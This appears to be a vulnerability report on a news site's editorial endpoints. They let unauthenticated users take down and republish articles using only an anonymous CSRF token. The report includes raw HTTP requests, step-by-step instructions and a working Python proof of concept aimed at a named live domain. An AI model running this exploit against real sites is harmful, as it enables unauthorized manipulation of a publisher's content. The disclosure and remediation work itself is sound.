# Unauthenticated Editorial Article Takedown and Publish via Missing Function-Level Authorization

**ID:** vuln-0004
**Severity:** CRITICAL
**Found:** 2026-09-04 08:08:32 UTC
**Target:** https://alfikr.id/
**Endpoint:** /edit/berita/takedown/ and /edit/berita/publish/
**Method:** POST
**CWE:** CWE-862
**CVSS:** 9.1
**Confidence:** High
**Fix Effort:** Medium

## Description

The editorial article state-changing endpoints accept requests from unauthenticated users when supplied only a CSRF token. An internet user can therefore hide arbitrary public articles and republish them without an editorial session.

## Evidence

Independent validation used public article ID `1829` from a fresh unauthenticated session. `GET /redaksi/login/` issued the anonymous `csrftoken` cookie; no login or authorization cookie was present. The exact request below returned success and changed public search visibility:

```http
POST /edit/berita/takedown/
Content-Type: application/json
X-CSRFToken: <anonymous-csrf-token>
Cookie: csrftoken=<anonymous-csrf-token>

{"id":1829}

HTTP/2 200

{"status":true}
```

Before takedown, `/cari/berita/json/` returned article `1829`; after takedown it was absent. Repeating the identical unauthenticated request against `/edit/berita/publish/` returned `{"status":true}` and article `1829` reappeared in `/cari/berita/json/`. The only cookie required was `csrftoken`; no authenticated session cookie was supplied.

## Impact

An attacker can disrupt publication of arbitrary articles by repeatedly invoking the takedown action, and can alter publication state without authorization. This enables unauthorized editorial manipulation and availability disruption across publicly indexed content.

## Counterevidence

The strongest mitigating possibility is that these endpoints could be intentionally public or limited by an unobserved deployment-layer policy. The observed requests were sent without an authenticated cookie and still caused durable visibility changes for a public article, and no application-level authorization challenge or role check was observed. If an external gateway restricts these paths in production, that control was not evidenced by the successful direct requests.

## What Would Change This Severity

Evidence that a production gateway or application policy rejects these exact requests unless an authenticated editorial identity with the required article permission is present would lower the severity; confirmation that arbitrary public article IDs can be changed repeatedly supports the current rating.

## Technical Analysis

The server treats a CSRF token obtained from the public editorial login form as sufficient to invoke the article state transitions. CSRF tokens defend against cross-site request forgery but do not establish identity or privileges; the takedown and publish handlers lack an authentication and function-level authorization check binding the requested article to an authorized editorial account.

## Proof of Concept

1. Start a new HTTP session; do not log in and do not provide an authorization cookie.
2. Request `GET /redaksi/login/` to bootstrap the anonymous `csrftoken` cookie and extract the token from the login form or cookie.
3. Request `GET /cari/berita/json/` (or the public latest-news JSON endpoint) and record that article `1829` is present before the state change.
4. Send `POST /edit/berita/takedown/` with `Content-Type: application/json`, the anonymous `csrftoken` cookie, `X-CSRFToken`, and the exact body `{"id":1829}`.
5. Confirm an HTTP success response containing `{"status":true}` and request `/cari/berita/json/` again; article `1829` is no longer returned.
6. Without changing the session or adding authentication, send `POST /edit/berita/publish/` with the same CSRF values and exact body `{"id":1829}`.
7. Confirm another success response and verify through `/cari/berita/json/` that article `1829` is returned again.

```python
import re
import requests

base_url = "https://alfikr.id"
article_id = 1829
session = requests.Session()

login_page = session.get(f"{base_url}/redaksi/login/", timeout=20)
form_token = re.search(
    r'name=["\\\']csrfmiddlewaretoken["\\\'][^>]*value=["\\\']([^"\\\']+)',
    login_page.text,
)
csrf_token = form_token.group(1) if form_token else session.cookies.get("csrftoken")
if not csrf_token:
    raise RuntimeError("Anonymous CSRF bootstrap failed")

# This session has the CSRF cookie only; it is not authenticated.
print("cookies:", sorted(session.cookies.keys()))

def search_contains_article():
    response = session.get(f"{base_url}/cari/berita/json/", timeout=20)
    print("search", response.status_code, "article_present=", str(article_id) in response.text)
    return response

search_contains_article()
headers = {
    "Content-Type": "application/json",
    "X-CSRFToken": csrf_token,
    "Referer": f"{base_url}/redaksi/login/",
}

for action in ("takedown", "publish"):
    response = session.post(
        f"{base_url}/edit/berita/{action}/",
        headers=headers,
        cookies={"csrftoken": csrf_token},
        json={"id": article_id},
        timeout=20,
    )
    print(action, response.status_code, response.text[:500])
    response.raise_for_status()
    search_contains_article()
```

## Remediation

Require an authenticated editorial session before entering either handler, and enforce server-side permission checks for the requested article state transition on every request. Bind the action to an explicit editorial permission such as publish/takedown, perform object-level authorization for the article ID, and return `401` or `403` when the session or permission is absent. Keep CSRF validation as a separate browser-request defense rather than treating it as authentication, and add regression tests covering anonymous, ordinary authenticated, and authorized-editor requests.

## Assumptions

The affected article IDs are production public articles and the endpoints are intended to be restricted to editorial users, as indicated by their placement under the editorial workflow. The attacker needs only network access and a public article ID; obtaining a CSRF token does not require logging in.
